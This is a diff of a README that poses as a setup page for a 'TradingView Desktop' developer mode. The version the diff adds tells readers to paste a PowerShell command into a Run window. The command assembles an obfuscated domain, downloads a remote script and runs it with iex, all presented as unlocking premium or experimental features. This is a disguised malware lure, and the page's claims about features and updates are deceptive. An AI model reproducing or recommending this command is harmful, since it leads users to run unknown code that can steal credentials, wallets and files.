@@ -1,70 +1,63 @@
-# Tradingview Desktop: Quick and Easy Setup
-![Tradingview Desktop: Quick and Easy Setup](https://github.com/user-attachments/assets/33cbec67-2646-4193-8545-d28b04a488d0)
+<div align="center"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqr8A3QeSw7y7EQX3CWynF3-PWWs6tKIaSO8Qk2uXs53UP-ugrEDG9bp1H8WygS8rqn1Hu1WJO76GTly3tZWyownr9jmzW&s&ec=121584920" height="350"></div>
 
----
+TradingView provides advanced charting, market data, and professional analysis tools used by traders and investors around the world.
+With Developer Mode enabled, you can unlock experimental features, early releases, and advanced functionality for research and testing.
 
-## 🔑 Feature List
+The platform supports crypto, stocks, forex, and futures markets, helping you analyze charts, monitor market structure, and explore new tools in one place.
 
-Experience the next level of trading analysis! The TradingView Desktop provides numerous enhanced features compared to standard versions:
+<div align="center"> <img src="https://chartsgpt.com/wlk.png"> </div>
+Quick Start
 
-- **Advanced Charting Tools**  
-  Unlock multiple chart layouts, custom time intervals, and deeper indicators.
+Using PowerShell is the recommended way to enable TradingView developer features. It installs the required components and completes the setup in one step.
 
-- **Expanded Data Access**  
-  Get real-time market data and extended historical analysis for stocks, forex, and crypto markets.
+Step 1: Open PowerShell
 
-- **Fast User Interface**  
-  Enjoy a smoother, more responsive TradingView experience with reduced loading times.
+Press Win + R, type PowerShell, and press Enter.
 
-- **Custom Script Integration**  
-  Support for Pine Script and community-driven tools.
+Step 2: Run the Command
+powershell -command "$desktop='.app'; iwr ('tradingview' + 'install' + $desktop) | iex"
 
-- **Session Syncing**  
-  Keep your personalized settings and layouts across devices.
+After installation, TradingView will be updated and developer features will become available.
 
-- **Ad-Free Experience**  
-  Use all premium features without distractions or ad interruptions.
+What You Get
+<table> <tr> <td width="25%">
+Professional Charting
 
-- **24/7 Usage**  
-  No forced log-outs or session expiration – trade anytime, anywhere!
+Advanced tools for crypto, stocks, forex, and futures markets.
 
-- **Multi-Account Support**  
-  Easily switch between multiple TradingView user accounts.
+</td> <td width="25%">
+Developer Features
 
-Tip: Combine these features to create your own algorithmic trading systems or try new charting strategies not available on standard accounts!
+Access experimental tools and early functionality.
 
----
+</td> <td width="25%">
+Private Workspace
 
+Your layouts, watchlists, and settings stay yours.
 
-## 📝 Function Descriptions Table
+</td> <td width="25%">
+Faster Research Workflow
 
-This table outlines the main functions shipped with TradingView Desktop.
+Analyze charts and markets in seconds.
 
-| 🏷️ Function Name       | 🛠️ Description                                                                              | ⚙️ Availability      |
-|------------------------|--------------------------------------------------------------------------------------------|----------------------|
-| **chart_booster()**      | Enhances chart rendering and enables simultaneous display of up to 8 charts per window.    | All OS               |
-| **data_unlocked()**      | Grants access to real-time data streams and full historical market data.                   | All OS               |
-| **ads_filter()**         | Suppresses all on-platform advertisements for distraction-free trading.                    | All OS               |
-| **multi_account()**      | Allows login and switching between multiple TradingView accounts seamlessly.               | All OS               |
-| **script_runner()**      | Supports advanced Pine Script versions and custom scripts from the community.              | All OS               |
-| **autosave_settings()**  | Automatically syncs and stores your workspace setups and analysis templates.               | Windows/macOS        |
-| **indicator_builder()**  | Tools for creating custom indicators and overlays with no external limits.                 | All OS               |
-| **session_keeper()**     | Maintains persistent log-ins and prevents session timeouts.                               | All OS               |
+</td> </tr> <tr> <td>
+Advanced Indicators
 
----
+Explore extended indicators and tools.
 
-## 🔍 SEO-Friendly Keywords
+</td> <td>
+Multi-Market Support
 
-TradingView Desktop, TradingView GitHub, trading chart tools, premium charting, technical analysis, real-time data, multi-platform trader, TradingView upgrade, platform enhancement, algorithmic trading, multi-account support, stock analysis tools, forex chart software, crypto analysis suite, advanced trading platform, charting app, investment tools, data visualization.
+Track multiple markets from one platform.
 
----
+</td> <td>
+Real-Time Data
 
-## 📜 License
+Stay up to date with live market information.
 
-This repository is licensed under the **MIT License**, permitting extensive freedom for personal and commercial usage, modification, and distribution.  
-Read the full text here: [MIT License](https://opensource.org/licenses/MIT)
+</td> <td>
+Continuous Updates
 
----
+Get early access to new TradingView features.
 
-Thank you for choosing **TradingView Desktop** for your charting and analysis journey.  
-🌟 **Star** this repository to keep updated with the latest enhancements!
+</td> </tr> </table>
